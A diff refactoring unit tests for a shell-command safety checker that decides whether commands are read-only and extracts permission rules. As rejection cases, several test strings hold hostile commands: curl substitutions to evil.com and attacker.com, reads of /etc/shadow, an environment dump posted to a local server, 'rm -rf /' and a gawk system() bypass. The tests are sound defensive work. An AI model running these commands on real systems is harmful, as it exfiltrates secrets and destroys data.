@@ -20,6 +20,17 @@ import {
 } from './shellAstParser.js';
 import { isShellCommandReadOnly } from './shellReadOnlyChecker.js';
 
+// One expect per command, in order.
+async function expectRules(command: string, rules: string[]) {
+  expect(await extractCommandRules(command)).toEqual(rules);
+}
+
+async function expectReadOnly(want: boolean, ...commands: string[]) {
+  for (const command of commands) {
+    expect(await isShellCommandReadOnlyAST(command)).toBe(want);
+  }
+}
+
 beforeAll(async () => {
   await initParser();
 });
@@ -33,21 +44,12 @@ afterAll(() => {
 // =========================================================================
 
 describe('isShellCommandReadOnlyAST', () => {
-  it('allows simple read-only command', async () => {
-    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
-  });
-
-  it('rejects mutating commands like rm', async () => {
-    expect(await isShellCommandReadOnlyAST('rm -rf temp')).toBe(false);
-  });
-
-  it('rejects redirection output', async () => {
-    expect(await isShellCommandReadOnlyAST('ls > out.txt')).toBe(false);
-  });
-
-  it('rejects command substitution', async () => {
-    expect(await isShellCommandReadOnlyAST('echo $(touch file)')).toBe(false);
-  });
+  it.each<[string, boolean, ...string[]]>([
+    ['allows simple read-only command', true, 'ls -la'],
+    ['rejects mutating commands like rm', false, 'rm -rf temp'],
+    ['rejects redirection output', false, 'ls > out.txt'],
+    ['rejects command substitution', false, 'echo $(touch file)'],
+  ])('%s', (_title, want, ...commands) => expectReadOnly(want, ...commands));
 
   it('rejects the two substitution forms from issue #8582', async () => {
     for (const command of [
@@ -60,15 +62,14 @@ describe('isShellCommandReadOnlyAST', () => {
   });
 
   it('keeps literal twins of issue #8582 read-only', async () => {
-    for (const command of [
+    await expectReadOnly(
+      true,
       'echo "\\$\\\n(touch /tmp/pwned)"',
       'echo "$$\\\n(touch /tmp/pwned)"',
       "echo '$\\\n(touch /tmp/pwned)'",
       "echo '${two@P}'",
       'echo "${two@Q}"',
-    ]) {
-      expect(await isShellCommandReadOnlyAST(command)).toBe(true);
-    }
+    );
   });
 
   describe('repository-local Git config (#8575)', () => {
@@ -82,6 +83,10 @@ describe('isShellCommandReadOnlyAST', () => {
     const gitConfig = (cwd: string, ...args: string[]): void => {
       execFileSync('git', ['config', ...args], { cwd });
     };
+    const expectInDir = async (cwd: string, command: string, want: boolean) =>
+      expect(await isShellCommandReadOnlyASTInDirectory(command, cwd)).toBe(
+        want,
+      );
 
     afterEach(() => {
       for (const dir of tempDirs.splice(0)) {
@@ -92,26 +97,16 @@ describe('isShellCommandReadOnlyAST', () => {
     it('downgrades only the two reproduced command/config pairs', async () => {
       const cwd = createRepo();
       gitConfig(cwd, 'diff.external', 'example-external-diff');
-      expect(await isShellCommandReadOnlyASTInDirectory('git diff', cwd)).toBe(
-        false,
-      );
-      expect(
-        await isShellCommandReadOnlyASTInDirectory('git status', cwd),
-      ).toBe(true);
+      await expectInDir(cwd, 'git diff', false);
+      await expectInDir(cwd, 'git status', true);
 
       gitConfig(cwd, '--unset', 'diff.external');
       gitConfig(cwd, 'core.fsmonitor', 'example-fsmonitor');
-      expect(
-        await isShellCommandReadOnlyASTInDirectory('git status', cwd),
-      ).toBe(false);
-      expect(await isShellCommandReadOnlyASTInDirectory('git diff', cwd)).toBe(
-        true,
-      );
+      await expectInDir(cwd, 'git status', false);
+      await expectInDir(cwd, 'git diff', true);
 
       gitConfig(cwd, 'core.fsmonitor', 'false');
-      expect(
-        await isShellCommandReadOnlyASTInDirectory('git status', cwd),
-      ).toBe(true);
+      await expectInDir(cwd, 'git status', true);
     });
 
     it('uses Git include and precedence semantics', async () => {
@@ -119,31 +114,17 @@ describe('isShellCommandReadOnlyAST', () => {
       const included = path.join(cwd, 'included.config');
       writeFileSync(included, '[diff]\n\texternal = included-driver\n');
       gitConfig(cwd, 'include.path', included);
-      expect(
-        await isShellCommandReadOnlyASTInDirectory("git 'diff'", cwd),
-      ).toBe(false);
+      await expectInDir(cwd, "git 'diff'", false);
 
       gitConfig(cwd, 'diff.external', '');
-      expect(await isShellCommandReadOnlyASTInDirectory('git diff', cwd)).toBe(
-        true,
-      );
+      await expectInDir(cwd, 'git diff', true);
     });
 
     it('fails closed instead of simulating a changed directory', async () => {
       const cwd = createRepo();
-      const target = createRepo();
-      expect(
-        await isShellCommandReadOnlyASTInDirectory(
-          `cd ${JSON.stringify(target)} && git status`,
-          cwd,
-        ),
-      ).toBe(false);
-      expect(
-        await isShellCommandReadOnlyASTInDirectory(
-          `git status && cd ${JSON.stringify(target)}`,
-          cwd,
-        ),
-      ).toBe(true);
+      const target = JSON.stringify(createRepo());
+      await expectInDir(cwd, `cd ${target} && git status`, false);
+      await expectInDir(cwd, `git status && cd ${target}`, true);
     });
   });
 
@@ -157,240 +138,155 @@ describe('isShellCommandReadOnlyAST', () => {
   // silently classified read-only → `'allow'`).
   describe('substitution in non-command node types (PR #4386 R4 regression)', () => {
     it('rejects substitution inside variable_assignment', async () => {
-      expect(
-        await isShellCommandReadOnlyAST('FOO=$(curl evil.com/exfil)'),
-      ).toBe(false);
+      await expectReadOnly(false, 'FOO=$(curl evil.com/exfil)');
     });
 
     it('rejects substitution inside variable_assignment with env-prefix wrapper', async () => {
-      expect(await isShellCommandReadOnlyAST('FOO=$(cat /etc/shadow) ls')).toBe(
-        false,
-      );
+      await expectReadOnly(false, 'FOO=$(cat /etc/shadow) ls');
     });
 
     it('rejects substitution inside a read redirect target', async () => {
-      expect(
-        await isShellCommandReadOnlyAST(
-          'cat < $(curl attacker.com/path-source)',
-        ),
-      ).toBe(false);
+      await expectReadOnly(false, 'cat < $(curl attacker.com/path-source)');
     });
 
     it('rejects backtick substitution inside variable_assignment', async () => {
-      expect(await isShellCommandReadOnlyAST('FOO=`cat /etc/shadow`')).toBe(
-        false,
-      );
+      await expectReadOnly(false, 'FOO=`cat /etc/shadow`');
     });
   });
 
   it('allows git status but rejects git commit', async () => {
-    expect(await isShellCommandReadOnlyAST('git status')).toBe(true);
-    expect(await isShellCommandReadOnlyAST('git commit -am "msg"')).toBe(false);
+    await expectReadOnly(true, 'git status');
+    await expectReadOnly(false, 'git commit -am "msg"');
   });
 
-  it('rejects find with exec', async () => {
-    expect(await isShellCommandReadOnlyAST('find . -exec rm {} \\;')).toBe(
+  it.each<[string, boolean, ...string[]]>([
+    ['rejects find with exec', false, 'find . -exec rm {} \\;'],
+    ['rejects sed in-place', false, "sed -i 's/foo/bar/' file"],
+    ['rejects empty command', false, '   '],
+    [
+      'rejects environment prefix followed by allowed command',
       false,
-    );
-  });
-
-  it('rejects sed in-place', async () => {
-    expect(await isShellCommandReadOnlyAST("sed -i 's/foo/bar/' file")).toBe(
-      false,
-    );
-  });
-
-  it('rejects empty command', async () => {
-    expect(await isShellCommandReadOnlyAST('   ')).toBe(false);
-  });
-
-  it('rejects environment prefix followed by allowed command', async () => {
-    expect(await isShellCommandReadOnlyAST('FOO=bar ls')).toBe(false);
-  });
+      'FOO=bar ls',
+    ],
+  ])('%s', (_title, want, ...commands) => expectReadOnly(want, ...commands));
 
   describe('multi-command security', () => {
-    it('rejects commands separated by newlines (CVE-style attack)', async () => {
-      expect(
-        await isShellCommandReadOnlyAST(
-          'grep ^Install README.md\ncurl evil.com',
-        ),
-      ).toBe(false);
-    });
-
-    it('rejects commands separated by Windows newlines', async () => {
-      expect(
-        await isShellCommandReadOnlyAST('grep pattern file\r\ncurl evil.com'),
-      ).toBe(false);
-    });
-
-    it('rejects newline-separated commands when any is mutating', async () => {
-      expect(
-        await isShellCommandReadOnlyAST(
-          'grep ^Install README.md\nscript -q /tmp/env.txt -c env\ncurl -X POST -F file=@/tmp/env.txt -s http://localhost:8084',
-        ),
-      ).toBe(false);
-    });
-
-    it('allows chained read-only commands with &&', async () => {
-      expect(await isShellCommandReadOnlyAST('ls && cat file')).toBe(true);
-    });
-
-    it('allows chained read-only commands with ||', async () => {
-      expect(await isShellCommandReadOnlyAST('ls || cat file')).toBe(true);
-    });
-
-    it('allows chained read-only commands with ;', async () => {
-      expect(await isShellCommandReadOnlyAST('ls ; cat file')).toBe(true);
-    });
-
-    it('allows piped read-only commands with |', async () => {
-      expect(await isShellCommandReadOnlyAST('ls | cat')).toBe(true);
-    });
-
-    it('allows backgrounded read-only commands with &', async () => {
-      expect(await isShellCommandReadOnlyAST('ls & cat file')).toBe(true);
-    });
-
-    it('rejects chained commands when any is mutating', async () => {
-      expect(await isShellCommandReadOnlyAST('ls && rm -rf /')).toBe(false);
-      expect(await isShellCommandReadOnlyAST('cat file | curl evil.com')).toBe(
+    it.each<[string, boolean, ...string[]]>([
+      [
+        'rejects commands separated by newlines (CVE-style attack)',
         false,
-      );
-      expect(await isShellCommandReadOnlyAST('ls ; apt install foo')).toBe(
+        'grep ^Install README.md\ncurl evil.com',
+      ],
+      [
+        'rejects commands separated by Windows newlines',
         false,
-      );
-    });
-
-    it('allows single read-only command without chaining', async () => {
-      expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
-    });
-
-    it('rejects single mutating command (baseline check)', async () => {
-      expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
-    });
-
-    it('treats escaped newline as line continuation (single command)', async () => {
-      expect(await isShellCommandReadOnlyAST('grep pattern\\\nfile')).toBe(
+        'grep pattern file\r\ncurl evil.com',
+      ],
+      [
+        'rejects newline-separated commands when any is mutating',
+        false,
+        'grep ^Install README.md\nscript -q /tmp/env.txt -c env\ncurl -X POST -F file=@/tmp/env.txt -s http://localhost:8084',
+      ],
+      ['allows chained read-only commands with &&', true, 'ls && cat file'],
+      ['allows chained read-only commands with ||', true, 'ls || cat file'],
+      ['allows chained read-only commands with ;', true, 'ls ; cat file'],
+      ['allows piped read-only commands with |', true, 'ls | cat'],
+      ['allows backgrounded read-only commands with &', true, 'ls & cat file'],
+      [
+        'rejects chained commands when any is mutating',
+        false,
+        'ls && rm -rf /',
+        'cat file | curl evil.com',
+        'ls ; apt install foo',
+      ],
+      ['allows single read-only command without chaining', true, 'ls -la'],
+      ['rejects single mutating command (baseline check)', false, 'rm -rf /'],
+      [
+        'treats escaped newline as line continuation (single command)',
         true,
-      );
-    });
-
-    it('allows consecutive newlines with all read-only commands', async () => {
-      expect(await isShellCommandReadOnlyAST('ls\n\ngrep foo')).toBe(true);
-    });
+        'grep pattern\\\nfile',
+      ],
+      [
+        'allows consecutive newlines with all read-only commands',
+        true,
+        'ls\n\ngrep foo',
+      ],
+    ])('%s', (_title, want, ...commands) => expectReadOnly(want, ...commands));
   });
 
   describe('awk command security', () => {
-    it('allows safe awk commands', async () => {
-      expect(await isShellCommandReadOnlyAST("awk '{print $1}' file.txt")).toBe(
+    it.each<[string, boolean, ...string[]]>([
+      [
+        'allows safe awk commands',
         true,
-      );
-      expect(
-        await isShellCommandReadOnlyAST('awk \'BEGIN {print "hello"}\''),
-      ).toBe(true);
-      expect(
-        await isShellCommandReadOnlyAST("awk '/pattern/ {print}' file.txt"),
-      ).toBe(true);
-    });
-
-    it('rejects awk with system() calls', async () => {
-      expect(
-        await isShellCommandReadOnlyAST('awk \'BEGIN {system("rm -rf /")}\' '),
-      ).toBe(false);
-      expect(
-        await isShellCommandReadOnlyAST(
-          'awk \'{system("touch file")}\' input.txt',
-        ),
-      ).toBe(false);
-    });
-
-    it('rejects gawk indirect function calls', async () => {
-      for (const command of [
+        "awk '{print $1}' file.txt",
+        'awk \'BEGIN {print "hello"}\'',
+        "awk '/pattern/ {print}' file.txt",
+      ],
+      [
+        'rejects awk with system() calls',
+        false,
+        'awk \'BEGIN {system("rm -rf /")}\' ',
+        'awk \'{system("touch file")}\' input.txt',
+      ],
+      [
+        'rejects gawk indirect function calls',
+        false,
         'awk \'BEGIN { fn = "system"; @fn("touch /tmp/pwned") }\'',
         'awk \'BEGIN { fn = "system"; @ fn("touch /tmp/pwned") }\'',
-      ]) {
-        expect(await isShellCommandReadOnlyAST(command)).toBe(false);
-      }
-    });
-
-    it('rejects awk with file output redirection', async () => {
-      expect(
-        await isShellCommandReadOnlyAST(
-          'awk \'{print > "output.txt"}\' input.txt',
-        ),
-      ).toBe(false);
-      expect(
-        await isShellCommandReadOnlyAST(
-          'awk \'{printf "%s\\n", $0 > "file.txt"}\'',
-        ),
-      ).toBe(false);
-      expect(
-        await isShellCommandReadOnlyAST(
-          'awk \'{print >> "append.txt"}\' input.txt',
-        ),
-      ).toBe(false);
-    });
-
-    it('rejects awk with command pipes', async () => {
-      expect(
-        await isShellCommandReadOnlyAST('awk \'{print | "sort"}\' input.txt'),
-      ).toBe(false);
-    });
-
-    it('rejects awk with getline from commands', async () => {
-      expect(
-        await isShellCommandReadOnlyAST('awk \'BEGIN {getline < "date"}\''),
-      ).toBe(false);
-      expect(
-        await isShellCommandReadOnlyAST('awk \'BEGIN {"date" | getline}\''),
-      ).toBe(false);
-    });
-
-    it('rejects awk with close() calls', async () => {
-      expect(
-        await isShellCommandReadOnlyAST('awk \'BEGIN {close("file")}\''),
-      ).toBe(false);
-    });
+      ],
+      [
+        'rejects awk with file output redirection',
+        false,
+        'awk \'{print > "output.txt"}\' input.txt',
+        'awk \'{printf "%s\\n", $0 > "file.txt"}\'',
+        'awk \'{print >> "append.txt"}\' input.txt',
+      ],
+      [
+        'rejects awk with command pipes',
+        false,
+        'awk \'{print | "sort"}\' input.txt',
+      ],
+      [
+        'rejects awk with getline from commands',
+        false,
+        'awk \'BEGIN {getline < "date"}\'',
+        'awk \'BEGIN {"date" | getline}\'',
+      ],
+      [
+        'rejects awk with close() calls',
+        false,
+        'awk \'BEGIN {close("file")}\'',
+      ],
+    ])('%s', (_title, want, ...commands) => expectReadOnly(want, ...commands));
   });
 
   describe('sed command security', () => {
-    it('allows safe sed commands', async () => {
-      expect(await isShellCommandReadOnlyAST("sed 's/foo/bar/' file.txt")).toBe(
+    it.each<[string, boolean, ...string[]]>([
+      [
+        'allows safe sed commands',
         true,
-      );
-      expect(await isShellCommandReadOnlyAST("sed -n '1,5p' file.txt")).toBe(
-        true,
-      );
-    });
-
-    it('rejects sed with execute command', async () => {
-      expect(
-        await isShellCommandReadOnlyAST("sed 's/foo/bar/e' file.txt"),
-      ).toBe(false);
-    });
-
-    it('rejects sed with write command', async () => {
-      expect(
-        await isShellCommandReadOnlyAST(
-          "sed 's/foo/bar/w output.txt' file.txt",
-        ),
-      ).toBe(false);
-    });
-
-    it('rejects sed with read command', async () => {
-      expect(
-        await isShellCommandReadOnlyAST("sed 's/foo/bar/r input.txt' file.txt"),
-      ).toBe(false);
-    });
-
-    it('still rejects sed in-place editing', async () => {
-      expect(
-        await isShellCommandReadOnlyAST("sed -i 's/foo/bar/' file.txt"),
-      ).toBe(false);
-      expect(
-        await isShellCommandReadOnlyAST("sed --in-place 's/foo/bar/' file.txt"),
-      ).toBe(false);
-    });
+        "sed 's/foo/bar/' file.txt",
+        "sed -n '1,5p' file.txt",
+      ],
+      ['rejects sed with execute command', false, "sed 's/foo/bar/e' file.txt"],
+      [
+        'rejects sed with write command',
+        false,
+        "sed 's/foo/bar/w output.txt' file.txt",
+      ],
+      [
+        'rejects sed with read command',
+        false,
+        "sed 's/foo/bar/r input.txt' file.txt",
+      ],
+      [
+        'still rejects sed in-place editing',
+        false,
+        "sed -i 's/foo/bar/' file.txt",
+        "sed --in-place 's/foo/bar/' file.txt",
+      ],
+    ])('%s', (_title, want, ...commands) => expectReadOnly(want, ...commands));
   });
 
   // =======================================================================
@@ -398,110 +294,41 @@ describe('isShellCommandReadOnlyAST', () => {
   // =======================================================================
 
   describe('AST-specific edge cases', () => {
-    it('rejects backtick command substitution', async () => {
-      expect(await isShellCommandReadOnlyAST('echo `rm -rf /`')).toBe(false);
-    });
-
-    it('rejects process substitution with write', async () => {
+    it.each<[string, boolean, ...string[]]>([
+      ['rejects backtick command substitution', false, 'echo `rm -rf /`'],
       // process_substitution is conservatively handled as command_substitution
-      expect(await isShellCommandReadOnlyAST('diff <(ls) <(ls -a)')).toBe(
-        false,
-      );
-    });
-
-    it('allows pure variable assignment', async () => {
-      expect(await isShellCommandReadOnlyAST('FOO=bar')).toBe(true);
-    });
-
-    it('rejects multiple env vars before command', async () => {
-      expect(await isShellCommandReadOnlyAST('A=1 B=2 ls -la')).toBe(false);
-    });
-
-    it('rejects function definitions', async () => {
-      expect(await isShellCommandReadOnlyAST('foo() { rm -rf /; }')).toBe(
-        false,
-      );
-    });
-
-    it('allows git diff', async () => {
-      expect(
-        await isShellCommandReadOnlyAST(
-          'git diff --word-diff=color -- file.txt',
-        ),
-      ).toBe(true);
-    });
-
-    it('allows git log', async () => {
-      expect(await isShellCommandReadOnlyAST('git log --oneline -10')).toBe(
+      ['rejects process substitution with write', false, 'diff <(ls) <(ls -a)'],
+      ['allows pure variable assignment', true, 'FOO=bar'],
+      ['rejects multiple env vars before command', false, 'A=1 B=2 ls -la'],
+      ['rejects function definitions', false, 'foo() { rm -rf /; }'],
+      ['allows git diff', true, 'git diff --word-diff=color -- file.txt'],
+      ['allows git log', true, 'git log --oneline -10'],
+      ['rejects git push', false, 'git push origin main'],
+      ['allows git --version / --help', true, 'git --version', 'git --help'],
+      ['allows input redirection (read-only)', true, 'cat < input.txt'],
+      ['rejects append redirection', false, 'echo hello >> out.txt'],
+      ['allows here-string', true, 'cat <<< "hello"'],
+      ['rejects nested command substitution', false, 'echo $(echo $(rm foo))'],
+      [
+        'allows complex pipeline of read-only commands',
         true,
-      );
-    });
-
-    it('rejects git push', async () => {
-      expect(await isShellCommandReadOnlyAST('git push origin main')).toBe(
+        'find . -name "*.ts" | grep -v node_modules | sort | head -20',
+      ],
+      [
+        'rejects pipeline with mutating command',
         false,
-      );
-    });
-
-    it('allows git --version / --help', async () => {
-      expect(await isShellCommandReadOnlyAST('git --version')).toBe(true);
-      expect(await isShellCommandReadOnlyAST('git --help')).toBe(true);
-    });
-
-    it('allows input redirection (read-only)', async () => {
-      expect(await isShellCommandReadOnlyAST('cat < input.txt')).toBe(true);
-    });
-
-    it('rejects append redirection', async () => {
-      expect(await isShellCommandReadOnlyAST('echo hello >> out.txt')).toBe(
-        false,
-      );
-    });
-
-    it('allows here-string', async () => {
-      expect(await isShellCommandReadOnlyAST('cat <<< "hello"')).toBe(true);
-    });
-
-    it('rejects nested command substitution', async () => {
-      expect(await isShellCommandReadOnlyAST('echo $(echo $(rm foo))')).toBe(
-        false,
-      );
-    });
-
-    it('allows complex pipeline of read-only commands', async () => {
-      expect(
-        await isShellCommandReadOnlyAST(
-          'find . -name "*.ts" | grep -v node_modules | sort | head -20',
-        ),
-      ).toBe(true);
-    });
-
-    it('rejects pipeline with mutating command', async () => {
-      expect(
-        await isShellCommandReadOnlyAST('find . -name "*.ts" | xargs rm'),
-      ).toBe(false);
-    });
-
-    it('allows git branch (no mutating flags)', async () => {
-      expect(await isShellCommandReadOnlyAST('git branch')).toBe(true);
-      expect(await isShellCommandReadOnlyAST('git branch -a')).toBe(true);
-    });
-
-    it('rejects git branch -d', async () => {
-      expect(await isShellCommandReadOnlyAST('git branch -d feature')).toBe(
-        false,
-      );
-    });
-
-    it('allows git remote (no mutating action)', async () => {
-      expect(await isShellCommandReadOnlyAST('git remote -v')).toBe(true);
-    });
-
-    it('rejects git remote add', async () => {
-      expect(await isShellCommandReadOnlyAST('git remote add origin url')).toBe(
-        false,
-      );
-    });
+        'find . -name "*.ts" | xargs rm',
+      ],
+      [
+        'allows git branch (no mutating flags)',
+        true,
+        'git branch',
+        'git branch -a',
+      ],
+      ['rejects git branch -d', false, 'git branch -d feature'],
+      ['allows git remote (no mutating action)', true, 'git remote -v'],
+      ['rejects git remote add', false, 'git remote add origin url'],
+    ])('%s', (_title, want, ...commands) => expectReadOnly(want, ...commands));
   });
 });
 
@@ -525,6 +352,19 @@ describe('classifyShellCommandSafety', () => {
   // adversarial inputs, which costs orders of magnitude rather than a small
   // multiple, so the headroom below does not blunt them.
   const maxClassificationCpuMs = 4000;
+  const expectClassifiedWithinBudget = async (
+    commands: string[],
+    expected: string[],
+  ) => {
+    const startedCpuUsage = process.cpuUsage();
+    await expect(
+      Promise.all(commands.map(classifyShellCommandSafety)),
+    ).resolves.toEqual(expected);
+    const cpuUsage = process.cpuUsage(startedCpuUsage);
+    expect((cpuUsage.user + cpuUsage.system) / 1000).toBeLessThan(
+      maxClassificationCpuMs,
+    );
+  };
 
   it.each([
     'ls -la',
@@ -558,6 +398,8 @@ describe('classifyShellCommandSafety', () => {
     "sed 's/hello/world/' file",
     "sed 's/error/warning/g' file",
     "sed -n '/needle/p' file",
+    "sed --quiet 's/a/b/' file",
+    "sed --silent 's/a/b/' file",
     "sed '/pattern/d' file",
     "sed 's/a/woutput/' file",
     "sed 's#x#s/a/b/woutput#' file",
@@ -573,25 +415,9 @@ describe('classifyShellCommandSafety', () => {
   });
 
   it.each([
-    ...[
-      'chgrp',
-      'chmod',
-      'chown',
-      'cp',
-      'install',
-      'ln',
-      'mkdir',
-      'mkfifo',
-      'mknod',
-      'mv',
-      'rename',
-      'rm',
-      'rmdir',
-      'shred',
-      'touch',
-      'truncate',
-      'unlink',
-    ].map((root) => `${root} target`),
+    ...'chgrp chmod chown cp install ln mkdir mkfifo mknod mv rename rm rmdir shred touch truncate unlink'
+      .split(' ')
+      .map((root) => `${root} target`),
     ...'add am checkout cherry-pick clean clone commit fetch gc init merge mv pull push rebase reset restore revert rm stash switch'
       .split(' ')
       .map((subcommand) => `git ${subcommand} target`),
@@ -663,6 +489,8 @@ describe('classifyShellCommandSafety', () => {
     "sed -ni.bak 's/a/b/' file",
     "sed -nI.bak 's/a/b/' file",
     "sed 's/a/b/w output' file",
+    "sed --quiet 'w output' file",
+    "sed --silent 'w output' file",
     "sed -e 's/a/b/' -e 'woutput' file",
     "sed 's/a/b/woutput' file",
     "sed 'woutput' file",
@@ -930,14 +758,7 @@ describe('classifyShellCommandSafety', () => {
       commands[0] = `echo $(${commands[0]}) < /dev/null`;
       commands[1] = `< <(${commands[1]}) cat`;
     }
-    const startedCpuUsage = process.cpuUsage();
-    await expect(
-      Promise.all(commands.map(classifyShellCommandSafety)),
-    ).resolves.toEqual(['unknown', 'unknown']);
-    const cpuUsage = process.cpuUsage(startedCpuUsage);
-    expect((cpuUsage.user + cpuUsage.system) / 1000).toBeLessThan(
-      maxClassificationCpuMs,
-    );
+    await expectClassifiedWithinBudget(commands, ['unknown', 'unknown']);
   });
 
   it('classifies adversarial rule inputs within the CPU budget', async () => {
@@ -954,10 +775,7 @@ describe('classifyShellCommandSafety', () => {
       `find . ${repeatedFindExec}`,
       `git status ${unmatchedBraces}`,
     ];
-    const startedCpuUsage = process.cpuUsage();
-    await expect(
-      Promise.all(commands.map(classifyShellCommandSafety)),
-    ).resolves.toEqual([
+    await expectClassifiedWithinBudget(commands, [
       'unknown',
       'read-only',
       'unknown',
@@ -965,10 +783,6 @@ describe('classifyShellCommandSafety', () => {
       'unknown',
       'read-only',
     ]);
-    const cpuUsage = process.cpuUsage(startedCpuUsage);
-    expect((cpuUsage.user + cpuUsage.system) / 1000).toBeLessThan(
-      maxClassificationCpuMs,
-    );
   });
 });
 
@@ -978,148 +792,99 @@ describe('classifyShellCommandSafety', () => {
 
 describe('extractCommandRules', () => {
   describe('simple commands', () => {
-    it('extracts root + known subcommand + wildcard', async () => {
-      expect(
-        await extractCommandRules('git clone https://github.com/foo/bar.git'),
-      ).toEqual(['git clone *']);
-    });
-
-    it('extracts npm install with wildcard', async () => {
-      expect(await extractCommandRules('npm install express')).toEqual([
-        'npm install *',
-      ]);
-    });
-
-    it('extracts npm outdated without wildcard (no extra args)', async () => {
-      expect(await extractCommandRules('npm outdated')).toEqual([
+    it.each<[string, string, string[]]>([
+      [
+        'extracts root + known subcommand + wildcard',
+        'git clone https://github.com/foo/bar.git',
+        ['git clone *'],
+      ],
+      [
+        'extracts npm install with wildcard',
+        'npm install express',
+        ['npm install *'],
+      ],
+      [
+        'extracts npm outdated without wildcard (no extra args)',
         'npm outdated',
-      ]);
-    });
-
-    it('extracts cat with wildcard', async () => {
-      expect(await extractCommandRules('cat /etc/passwd')).toEqual(['cat *']);
-    });
-
-    it('extracts ls with wildcard', async () => {
-      expect(await extractCommandRules('ls -la /tmp')).toEqual(['ls *']);
-    });
-
-    it('extracts bare command without args', async () => {
-      expect(await extractCommandRules('whoami')).toEqual(['whoami']);
-    });
-
-    it('extracts unknown command with wildcard', async () => {
-      expect(await extractCommandRules('curl https://example.com')).toEqual([
-        'curl *',
-      ]);
-    });
-
-    it('extracts command with only flags', async () => {
-      expect(await extractCommandRules('ls -la')).toEqual(['ls *']);
+        ['npm outdated'],
+      ],
+      ['extracts cat with wildcard', 'cat /etc/passwd', ['cat *']],
+      ['extracts ls with wildcard', 'ls -la /tmp', ['ls *']],
+      ['extracts bare command without args', 'whoami', ['whoami']],
+      [
+        'extracts unknown command with wildcard',
+        'curl https://example.com',
+        ['curl *'],
+      ],
+      ['extracts command with only flags', 'ls -la', ['ls *']],
+    ])('%s', async (_title, command, rules) => {
+      expect(await extractCommandRules(command)).toEqual(rules);
     });
   });
 
   describe('compound commands', () => {
-    it('extracts rules from && compound', async () => {
-      expect(await extractCommandRules('git clone foo && npm install')).toEqual(
+    it.each<[string, string, string[]]>([
+      [
+        'extracts rules from && compound',
+        'git clone foo && npm install',
         ['git clone *', 'npm install'],
-      );
-    });
-
-    it('extracts rules from || compound', async () => {
-      expect(await extractCommandRules('git pull || git fetch origin')).toEqual(
+      ],
+      [
+        'extracts rules from || compound',
+        'git pull || git fetch origin',
         ['git pull', 'git fetch *'],
-      );
-    });
-
-    it('extracts rules from ; compound', async () => {
-      expect(await extractCommandRules('ls ; cat file')).toEqual([
-        'ls',
-        'cat *',
-      ]);
-    });
-
-    it('extracts rules from pipeline', async () => {
-      expect(await extractCommandRules('cat file | grep pattern')).toEqual([
-        'cat *',
-        'grep *',
-      ]);
-    });
-
-    it('deduplicates rules', async () => {
-      expect(
-        await extractCommandRules('npm install foo && npm install bar'),
-      ).toEqual(['npm install *']);
+      ],
+      ['extracts rules from ; compound', 'ls ; cat file', ['ls', 'cat *']],
+      [
+        'extracts rules from pipeline',
+        'cat file | grep pattern',
+        ['cat *', 'grep *'],
+      ],
+      [
+        'deduplicates rules',
+        'npm install foo && npm install bar',
+        ['npm install *'],
+      ],
+    ])('%s', async (_title, command, rules) => {
+      expect(await extractCommandRules(command)).toEqual(rules);
     });
   });
 
   describe('docker multi-level subcommands', () => {
     it('extracts docker compose up with args', async () => {
-      expect(await extractCommandRules('docker compose up -d')).toEqual([
-        'docker compose up *',
-      ]);
+      await expectRules('docker compose up -d', ['docker compose up *']);
     });
 
     it('extracts docker compose up without args', async () => {
-      expect(await extractCommandRules('docker compose up')).toEqual([
-        'docker compose up',
-      ]);
+      await expectRules('docker compose up', ['docker compose up']);
     });
 
     it('extracts docker run with wildcard', async () => {
-      expect(await extractCommandRules('docker run -it ubuntu bash')).toEqual([
-        'docker run *',
-      ]);
+      await expectRules('docker run -it ubuntu bash', ['docker run *']);
     });
   });
 
   describe('edge cases', () => {
-    it('returns empty for empty string', async () => {
-      expect(await extractCommandRules('')).toEqual([]);
-    });
-
-    it('returns empty for whitespace', async () => {
-      expect(await extractCommandRules('   ')).toEqual([]);
-    });
-
-    it('handles env var prefix', async () => {
-      expect(await extractCommandRules('FOO=bar npm install')).toEqual([
-        'npm install',
-      ]);
-    });
-
-    it('handles redirected command', async () => {
-      expect(await extractCommandRules('echo hello > out.txt')).toEqual([
-        'echo *',
-      ]);
-    });
-
-    it('handles pure variable assignment (no rule)', async () => {
-      expect(await extractCommandRules('FOO=bar')).toEqual([]);
-    });
-
-    it('extracts cargo subcommands', async () => {
-      expect(await extractCommandRules('cargo build --release')).toEqual([
-        'cargo build *',
-      ]);
-    });
-
-    it('extracts kubectl subcommands', async () => {
-      expect(await extractCommandRules('kubectl get pods -n default')).toEqual([
-        'kubectl get *',
-      ]);
-    });
-
-    it('extracts pip install', async () => {
-      expect(await extractCommandRules('pip install requests')).toEqual([
-        'pip install *',
-      ]);
-    });
-
-    it('extracts pnpm subcommands', async () => {
-      expect(await extractCommandRules('pnpm add -D typescript')).toEqual([
-        'pnpm add *',
-      ]);
+    it.each<[string, string, string[]]>([
+      ['returns empty for empty string', '', []],
+      ['returns empty for whitespace', '   ', []],
+      ['handles env var prefix', 'FOO=bar npm install', ['npm install']],
+      ['handles redirected command', 'echo hello > out.txt', ['echo *']],
+      ['handles pure variable assignment (no rule)', 'FOO=bar', []],
+      [
+        'extracts cargo subcommands',
+        'cargo build --release',
+        ['cargo build *'],
+      ],
+      [
+        'extracts kubectl subcommands',
+        'kubectl get pods -n default',
+        ['kubectl get *'],
+      ],
+      ['extracts pip install', 'pip install requests', ['pip install *']],
+      ['extracts pnpm subcommands', 'pnpm add -D typescript', ['pnpm add *']],
+    ])('%s', async (_title, command, rules) => {
+      expect(await extractCommandRules(command)).toEqual(rules);
     });
   });
 });
@@ -1305,14 +1070,17 @@ describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyA
     ['echo hello >> out.txt', false, 'append redirection'],
   ];
 
-  for (const [cmd, expected, note] of sharedCases) {
-    it(`${note ? `[${note}] ` : ''}${JSON.stringify(cmd).slice(0, 60)} → ${expected}`, async () => {
-      const regexResult = isShellCommandReadOnly(cmd);
-      const astResult = await isShellCommandReadOnlyAST(cmd);
+  // Regex and AST checkers both return `want`.
+  const expectBoth = async (command: string, want: boolean) => {
+    const regexResult = isShellCommandReadOnly(command);
+    const astResult = await isShellCommandReadOnlyAST(command);
+    expect(regexResult).toBe(want);
+    expect(astResult).toBe(want);
+  };
 
-      expect(regexResult).toBe(expected);
-      expect(astResult).toBe(expected);
-    });
+  for (const [cmd, expected, note] of sharedCases) {
